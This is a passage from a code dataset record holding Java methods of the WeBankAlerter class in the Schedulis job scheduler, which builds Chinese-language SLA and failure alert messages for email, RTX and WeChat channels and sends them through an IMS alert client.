\")\u5df2\u7ecf\u6267\u884c\u5931\u8d25\uff0c\u7b49\u5f85\u4eba\u5de5\u5904\u7406.\" + split;    slaText = basicInfo + expected;    return slaText;  }  /**   * Email SLA\u544a\u8b66\u4fe1\u606f\u6a21\u677f   * @param flow       \u6267\u884c\u7684flow   * @param slaOption  SLA\u914d\u7f6e   * @param taskType   \u4efb\u52a1\u7c7b\u578b   * @param runStatus  \u8fd0\u884c\u72b6\u6001   * @return   */  private static String buildEmailFinishSlaMessageText(ExecutableFlow flow, SlaOption slaOption, String taskType, String runStatus){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    runStatus = \"Finish\".equals(runStatus) ? \"Finish\":runStatus;    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \" ! </br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      String endTime = fmt.print(new DateTime(flow.getEndTime()));      if(flow.getStatus() == Status.FAILED_FINISHING){        endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f\";      }      List<ExecutableNode> executableNodes = new ArrayList<>();      FlowUtils.getAllFailedNodeList(flow, executableNodes);      List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);      failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: </br>\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"</br>\"              + \"\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \" + failedNodeNestId.toString() + \"</br>\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".</br>\"              + \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + endTime + \".</br>\"              + \"\u5de5\u4f5c\u6d41\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(flow.getStartTime(), flow.getEndTime()) + \".</br>\";      slaText = basicInfo + expected;    } else {      final String jobName =          (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u4efb\u52a1(Job) \" + jobName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \"! </br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: </br>\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \".</br>\"              + \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \".</br>\"              + \"\u4efb\u52a1\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(job.getStartTime(), job.getEndTime()) + \".</br>\"              + \"\u4efb\u52a1\u5c5e\u4e8e\u5de5\u4f5c\u6d41: \" + flow.getId() + \".</br>\";      slaText = basicInfo + expected;    }    return slaText;  }  /**   * \u521b\u5efa RTX \u8d85\u65f6\u544a\u8b66\u4fe1\u606f   * @param slaOption SLA\u914d\u7f6e\u5bf9\u8c61   * @param flow \u4efb\u52a1\u5bf9\u8c61   * @return   */  public static String createRTXSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_FINISH)) {      return buildRTXSlaMessageText(slaOption, flow, \"Flow\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_FLOW_SUCCEED)) {      return buildRTXSlaMessageText(slaOption, flow, \"Flow\", \"Succeed\");    } else if (type.equals(SlaOption.TYPE_JOB_FINISH)) {      return buildRTXSlaMessageText(slaOption, flow, \"Job\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCEED)) {      return buildRTXSlaMessageText(slaOption, flow, \"Job\", \"Succeed\");    } else {      return \"Unrecognized SLA type \" + type;    }  }  /**   * \u521b\u5efa Email \u8d85\u65f6\u544a\u8b66\u4fe1\u606f   * @param slaOption SLA\u914d\u7f6e\u5bf9\u8c61   * @param flow \u4efb\u52a1\u5bf9\u8c61   * @return   */  public static String createEmailSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_FINISH)) {      return buildEmailSlaMessageText(slaOption, flow, \"Flow\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_FLOW_SUCCEED)) {      return buildEmailSlaMessageText(slaOption, flow, \"Flow\", \"Succeed\");    } else if (type.equals(SlaOption.TYPE_JOB_FINISH)) {      return buildEmailSlaMessageText(slaOption, flow, \"Job\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCEED)) {      return buildEmailSlaMessageText(slaOption, flow, \"Job\", \"Succeed\");    } else {      return \"Unrecognized SLA type \" + type;    }  }  /**   * \u8d85\u65f6\u544a\u8b66 RTX\u6a21\u677f   * @param slaOption   * @param flow   * @param taskType   * @param runStatus   * @return   */  private static String buildRTXSlaMessageText(final SlaOption slaOption, final ExecutableFlow flow, String taskType, String runStatus){    final int execId = flow.getExecutionId();    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName =          (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      final String duration =          (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your flow \" + flowName + \" failed to \" + runStatus + \" within \" + duration + \"\\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : \\n\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"\\n\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getStartTime())) + \"\\n\";              //+ \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getEndTime())) + \"\\n\";      final String actual = \"\u5de5\u4f5c\u6d41\u73b0\u5728\u7684\u72b6\u6001\u662f \" + flow.getStatus() + \".\\n\";      return basicinfo + expected + actual;    }else if (\"Job\".equals(taskType)) {      final String jobName =          (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      final String duration =          (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your job \" + jobName + \" failed to \" + runStatus + \" within \" + duration + \"\\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : \\n\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u4efb\u52a1: \" + jobName + \"\\n\"              + \"\u4efb\u52a1\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"\\n\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \"\\n\";              //+ \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \"\\n\";      final String actual = \"\u4efb\u52a1\u73b0\u5728\u7684\u72b6\u6001\u662f \" + job.getStatus() + \".\\n\";      return basicinfo + expected + actual;    } else {      return \"\u672a\u5339\u914d\u5230\u4efb\u52a1\u7c7b\u578b\";    }  }  /**   * \u8d85\u65f6\u544a\u8b66 Email\u6a21\u677f   * @param slaOption   * @param flow   * @param taskType   * @param runStatus   * @return   */  private static String buildEmailSlaMessageText(final SlaOption slaOption, final ExecutableFlow flow, String taskType, String runStatus){    final int execId = flow.getExecutionId();    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      final String duration = (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your flow \" + flowName + \" failed to \" + runStatus + \" within \" + duration + \"</br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : </br>\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"</br>\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getStartTime())) + \"</br>\";              //+ \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getEndTime())) + \"</br>\";      final String actual = \"\u5de5\u4f5c\u6d41\u73b0\u5728\u7684\u72b6\u6001\u662f \" + flow.getStatus() + \".</br>\";      return basicinfo + expected + actual;    }else if (\"Job\".equals(taskType)) {      final String jobName = (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      final String duration = (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your job \" + jobName + \" failed to \" + runStatus + \" within \" + duration + \"</br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : </br>\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u4efb\u52a1: \" + jobName + \"</br>\"              + \"\u4efb\u52a1\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"</br>\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \"</br>\";              //+ \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \"</br>\";      final String actual = \"\u4efb\u52a1\u73b0\u5728\u7684\u72b6\u6001\u662f \" + job.getStatus() + \".</br>\";      return basicinfo + expected + actual;    } else {      return \"\u672a\u5339\u914d\u5230\u4efb\u52a1\u7c7b\u578b\";    }  }  private static long flowStartTimeChecker(final ExecutableFlow flow){    if(-1 == flow.getStartTime()){      return flow.getEndTime();    } else {      return flow.getStartTime();    }  }  public static void main(String[] args) {    String time = fmt.print(new DateTime(0));    System.out.printf(time);  }  @Override  public void alertOnFailedUpdate(Executor executor, List<ExecutableFlow> executions, ExecutorManagerException e) {    // TODO  }  @Override  public void alertOnCycleFlowInterrupt(ExecutableFlow flow, ExecutionCycle cycleFlow, List<String> emails, String alertLevel, String... extraReasons) {    String newTitle = String.format(\"[%s:%s] %s\", flow.getProjectName(), flow.getFlowId(), this.title);    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if (imsAlerterWays.contains(\"2\")) {      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 webank \u90ae\u7bb1\u544a\u8b66\");      String webankAlertEmail = createCycleFlowAlertMessage(flow, cycleFlow, emails, \"</br>\");      handleWebankAlert(webankAlertEmail, emails, AlertLevel.valueOf(alertLevel), newTitle);    }    if (imsAlerterWays.contains(\"3\")) {      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 webank \u5fae\u4fe1\u544a\u8b66\");      String slaMessageWeChat = createCycleFlowAlertMessage(flow, cycleFlow, emails, \"\\n\");      handleWebankAlert(slaMessageWeChat, emails, AlertLevel.valueOf(alertLevel), newTitle);    }  }  private String createCycleFlowAlertMessage(ExecutableFlow f, ExecutionCycle flow, List<String> emails, String lineSeparator) {    //\u83b7\u53d6\u9009\u9879\u8bbe\u7f6e    StringBuffer stringBuffer = new StringBuffer();    List<String> contacts = emails.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    stringBuffer.append(lineSeparator);    stringBuffer.append(\"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + lineSeparator);    String header = \"WTSS\u5faa\u73af\u5de5\u4f5c\u6d41\u88ab\u4e2d\u65ad\uff0c\u8be6\u60c5\u5982\u4e0b\uff1a\";    stringBuffer.append(header);    stringBuffer.append(\"  \" + lineSeparator + \"\u9879\u76eeID: \");    stringBuffer.append(flow.getProjectId());    stringBuffer.append(\";  \" + lineSeparator + \"\u9879\u76ee\u540d\u79f0: \");    stringBuffer.append(f.getProjectName());    stringBuffer.append(\";  \" + lineSeparator + \"\u5de5\u4f5c\u6d41\u540d\u79f0: \");    stringBuffer.append(flow.getFlowId());    stringBuffer.append(\";  \" + lineSeparator + \"\u6267\u884cID: \");    stringBuffer.append(flow.getCurrentExecId());    stringBuffer.append(\";  \" + lineSeparator + \"\u63d0\u4ea4\u4eba: \") ;    stringBuffer.append(flow.getSubmitUser());    stringBuffer.append(\";  \" + lineSeparator + \"\u63d0\u4ea4\u65f6\u95f4: \") ;    stringBuffer.append(fmt.print(new DateTime(flow.getSubmitTime())));    stringBuffer.append(\";  \" + lineSeparator + \"\u4ee3\u7406\u7528\u6237: \") ;    stringBuffer.append(f.getProxyUsers());    stringBuffer.append(\";  \" + lineSeparator + \"\u5f00\u59cb\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getStartTime())));    stringBuffer.append(\";  \" + lineSeparator + \"\u7ed3\u675f\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getEndTime())));    stringBuffer.append(\";  \" + lineSeparator + \"\u8017\u65f6: \");    stringBuffer.append(Utils.formatDuration(flow.getStartTime(), flow.getEndTime()));    stringBuffer.append(\";  \" + lineSeparator + \"\u72b6\u6001: \");    stringBuffer.append(flow.getStatus());    if(f.getExecutionOptions().getDisabledJobs().size()>0) {      stringBuffer.append(lineSeparator + \"disabled job(\");      List<Object> disableJobs = f.getExecutionOptions().getDisabledJobs();      for (Object djob : disableJobs) {        stringBuffer.append(\"; \" + lineSeparator + djob + \"\u3001\");      }      stringBuffer.append(lineSeparator + \")\");    }    return stringBuffer.toString();  }}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "doAlertByWeBank", "params": ["ExecutableFlow", "List<String>", "AlertLevel"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void doAlertByWeBank(ExecutableFlow flow, List<String> emails, AlertLevel alertLevel){//    if(this.alerterWay.contains(\"1\")){      //1 RTX\u6e20\u9053//      this.setAlerterWay(\"1\");//      logger.info(\"\u53d1\u9001 webank RTX\u544a\u8b66\");//      //\u7ec4\u88c5RTX\u683c\u5f0f\u4fe1\u606f//      String webankAlertRTX = createRTXAlertMessage(flow);////      handleWebankAlert(webankAlertRTX, emails, alertLevel);//    }    String newTitle = String.format(\"[%s:%s] %s\", flow.getProjectName(), flow.getFlowId(), this.title);    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")){      //2 \u90ae\u7bb1\u6e20\u9053      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 webank \u90ae\u7bb1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String webankAlertEmail = createEmailAlertMessage(flow);      handleWebankAlert(webankAlertEmail, emails, alertLevel, newTitle);    }    if(imsAlerterWays.contains(\"3\")){      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 webank \u5fae\u4fe1\u544a\u8b66\");      //\u7ec4\u88c5\u5fae\u4fe1\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = createRTXAlertMessage(flow);      handleWebankAlert(slaMessageWeChat, emails, alertLevel, newTitle);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "handleWebankAlert", "params": ["String", "List<String>", "AlertLevel", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleWebankAlert(String webankAlertMessage, List<String> emails, AlertLevel alertLevel, String newTitle){    logger.info(\" -->1. doAlertByWeBank(ExecutableFlow flow) method is start executing\");    logger.info(\"\u5f00\u59cb\u53d1\u9001IMS\u544a\u8b66\u3002\");    IMSAlert imsAlert = new IMSAlert(this.alarmServer,        this.alarmPort,        Integer.parseInt(this.alarmSubSystemID),        newTitle,        logger);    logger.info(\" --> 2. new IMSAlerter instance is success : \" + imsAlert);    //\u544a\u8b66\u4fe1\u606f    imsAlert.setAlertInfo(webankAlertMessage);    //\u544a\u8b66\u65b9\u5f0f    String[] strArr = this.alerterWay.split(\",\") ;    for(int i=0 ; i < strArr.length ; i++){      if(strArr[i].matches(\"\\\\d\")){        imsAlert.addAlertWay(Integer.parseInt(strArr[i]));      }    }    logger.info(\"--> 3.process alerterWay is successed\");    //\u544a\u8b66\u7ea7\u522b    imsAlert.setAlertLevel(alertLevel);    //toEcc    imsAlert.setToECC(Integer.valueOf(this.toEcc));    //\u901a\u77e5\u5bf9\u8c61 adminstrators    List<String> alerter = new ArrayList<>();    String[] alerterArr = this.alerterReciver.split(\",\");    for(int i=0 ; i < alerterArr.length ; i++){      alerter.add(alerterArr[i]);    }    //\u6dfb\u52a0\u6307\u5b9a\u544a\u8b66\u4eba    for(String str : emails){      String temp = str.split(\"@\")[0];      alerter.add(temp);      logger.info(\"\u6dfb\u52a0\u6307\u5b9a\u544a\u8b66\u4eba: \" + temp);    }    logger.info(\"--> 4.process alerterReciver is successed\");    imsAlert.setAlertReceivers(alerter);    IMSAlert.Result rs = null ;    try {      rs = imsAlert.alert();      logger.info(\"\u8c03IMS\u63a5\u53e3\u8fd4\u56de\u7ed3\u679c: \" + rs.toString());    } catch (IOException e) {      logger.error(\"\u8c03IMS\u63a5\u53e3\u51fa\u9519: \",e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "createRTXAlertMessage", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String createRTXAlertMessage(ExecutableFlow flow){    //\u83b7\u53d6\u9009\u9879\u8bbe\u7f6e    ExecutionOptions option = flow.getExecutionOptions();    StringBuffer stringBuffer = new StringBuffer();    String dep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"WTSS\" : flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<ExecutableNode> executableNodes = new ArrayList<>();    FlowUtils.getAllFailedNodeList(flow, executableNodes);    List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);    failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);    List<String> emails = null;    if(flow.getStatus().equals(Status.SUCCEEDED)){      emails = flow.getExecutionOptions().getSuccessEmails();    } else {      emails = flow.getExecutionOptions().getFailureEmails();    }    List<String> contacts = emails.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    stringBuffer.append(\"\\n\");    stringBuffer.append(\"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\");    //stringBuffer.append(flow.getOtherOption().get(\"alertUserDeparment\"));    stringBuffer.append( \"WTSS\u7cfb\u7edf\u6d88\u606f\uff0c\u8be6\u60c5\u5982\u4e0b\uff1a\");    stringBuffer.append(\"  \\n\u9879\u76eeID: \");    stringBuffer.append(flow.getProjectId());    stringBuffer.append(\";  \\n\u9879\u76ee\u540d\u79f0: \");    stringBuffer.append(flow.getProjectName());    stringBuffer.append(\";  \\n\u5de5\u4f5c\u6d41\u540d\u79f0: \");    stringBuffer.append(flow.getFlowId());    stringBuffer.append(\";  \\n\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \");    stringBuffer.append(failedNodeNestId.toString());    stringBuffer.append(\";  \\n\u6267\u884cID: \");    stringBuffer.append(flow.getExecutionId());    stringBuffer.append(\";  \\n\u63d0\u4ea4\u4eba: \") ;    stringBuffer.append(flow.getSubmitUser());    stringBuffer.append(\";  \\n\u63d0\u4ea4\u65f6\u95f4: \") ;    stringBuffer.append(fmt.print(new DateTime(flow.getSubmitTime())));    stringBuffer.append(\";  \\n\u4ee3\u7406\u7528\u6237: \") ;    stringBuffer.append(flow.getProxyUsers());    stringBuffer.append(\";  \\n\u5f00\u59cb\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getStartTime())));    String endTime = fmt.print(new DateTime(flow.getEndTime()));    if(flow.getStatus() == Status.FAILED_FINISHING){      endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f.\";    }    stringBuffer.append(\";  \\n\u7ed3\u675f\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(endTime);    stringBuffer.append(\";  \\n\u8017\u65f6: \");    stringBuffer.append(Utils.formatDuration(flow.getStartTime(), flow.getEndTime()));    stringBuffer.append(\";  \\n\u72b6\u6001: \");    stringBuffer.append(flow.getStatus());    if(flow.getExecutionOptions().getDisabledJobs().size()>0) {      stringBuffer.append(\"\\ndisabled job(\");      List<Object> disableJobs = flow.getExecutionOptions().getDisabledJobs();      for (Object djob : disableJobs) {        stringBuffer.append(\"; \\n\" + djob + \"\u3001\");      }      stringBuffer.append(\"\\n)\");    }    return stringBuffer.toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "createEmailAlertMessage", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String createEmailAlertMessage(ExecutableFlow flow){    //\u83b7\u53d6\u9009\u9879\u8bbe\u7f6e    ExecutionOptions option = flow.getExecutionOptions();    StringBuffer stringBuffer = new StringBuffer();    String dep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"WTSS\" : flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<ExecutableNode> executableNodes = new ArrayList<>();    FlowUtils.getAllFailedNodeList(flow, executableNodes);    List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);    failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);    List<String> emails = null;    if(flow.getStatus().equals(Status.SUCCEEDED)){      emails = flow.getExecutionOptions().getSuccessEmails();    } else {      emails = flow.getExecutionOptions().getFailureEmails();    }    List<String> contacts = emails.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    stringBuffer.append(\"</br>\");    stringBuffer.append(\"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\");    stringBuffer.append(\"WTSS\u7cfb\u7edf\u6d88\u606f\uff0c\u8be6\u60c5\u5982\u4e0b\uff1a\");    stringBuffer.append(\"  </br>\u9879\u76eeID: \");    stringBuffer.append(flow.getProjectId());    stringBuffer.append(\";  </br>\u9879\u76ee\u540d\u79f0: \");    stringBuffer.append(flow.getProjectName());    stringBuffer.append(\";  </br>\u5de5\u4f5c\u6d41\u540d\u79f0: \");    